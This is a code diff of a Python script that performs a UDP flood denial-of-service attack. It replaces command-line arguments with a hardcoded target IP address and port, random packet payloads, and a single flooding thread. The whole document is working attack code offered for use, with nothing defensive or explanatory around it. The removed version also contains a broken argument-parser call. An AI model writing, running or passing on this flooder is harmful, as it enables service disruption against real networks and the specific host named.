@@ -1,36 +1,46 @@
 import socket
 import threading
 import time
-import argparse
+from random import randint
 
-def udp_flood(target_ip, target_port, duration):
+# Configuration
+TARGET_IP = '34.0.14.194'  # Replace with the target IP address
+TARGET_PORT = 10120         # Replace with the target port number
+PACKET_SIZE = 1024       # Size of the UDP packet in bytes
+DURATION = 60            # Duration of the attack in seconds
+
+# Create a UDP socket
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+
+def generate_random_payload(size):
+    """Generate a random payload of a given size."""
+    return bytes([randint(0, 255) for _ in range(size)])
+
+def udp_flood(target_ip, target_port, packet_size, duration):
+    """Perform a UDP flood attack on the specified target."""
     start_time = time.time()
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while time.time() - start_time < duration:
-        message = b"X" * 1024  # 1KB payload
-        sock.sendto(message, (target_ip, target_port))
-    
-    sock.close()
+        payload = generate_random_payload(packet_size)
+        sock.sendto(payload, (target_ip, target_port))
+        
+        # Print status every 10 seconds
+        if int(time.time() - start_time) % 10 == 0:
+            print(f"Sending packets to {target_ip}:{target_port}...")
 
-def start_attack(target_ip, target_port, threads, duration):
-    for _ in range(threads):
-        thread = threading.Thread(target=udp_flood, args=(target_ip, target_port, duration))
-        thread.start()
+# Main function to initiate the attack
+def main():
+    print(f"Starting UDP flood attack on {TARGET_IP}:{TARGET_PORT} for {DURATION} seconds.")
+    
+    # Start the attack in a separate thread
+    attack_thread = threading.Thread(target=udp_flood, args=(TARGET_IP, TARGET_PORT, PACKET_SIZE, DURATION))
+    attack_thread.start()
+    
+    # Wait for the attack to finish
+    attack_thread.join()
+    
+    print("UDP flood attack completed.")
 
 if __name__ == "__main__":
-    parser = argparse.ArgumentParser(description="UDP Flood Attack")
-    parser.add_argument("ip", type=str, help="Target IP address", required=True)
-    parser.add_argument("port", type=int, help="Target port", required=True)
-    parser.add_argument("--threads", type=int, default=10, help="Number of threads to use (default: 10)")
-    parser.add_argument("--duration", type=int, default=60, help="Duration of the attack in seconds (default: 60)")
-
-    args = parser.parse_args()
-
-    target_ip = args.ip
-    target_port = args.port
-    threads = args.threads
-    duration = args.duration
-
-    print(f"Starting UDP flood attack on {target_ip}:{target_port} for {duration} seconds with {threads} threads.")
-    start_attack(target_ip, target_port, threads, duration)
+    main()
+    
